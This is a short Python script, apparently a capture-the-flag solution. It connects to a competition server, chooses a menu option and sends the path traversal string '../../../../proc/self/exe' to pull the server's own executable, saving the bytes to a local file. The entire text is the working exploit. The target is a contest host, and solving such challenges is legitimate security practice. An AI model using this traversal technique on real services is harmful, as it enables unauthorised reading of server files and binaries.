#!/usr/bin/env python3

import socket

HOST='mngmnt-iface.ctfcompetition.com'
PORT=1337
BUFFER_SIZE=1024

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
s.send('2\n'.encode('utf-8'))
s.send('../../../../../../../../../../proc/self/exe\n'.encode('utf-8'))

data = open('data.bin', 'wb')
while True:
    data.write(s.recv(BUFFER_SIZE))
    data.flush()
s.close() 
data.close()
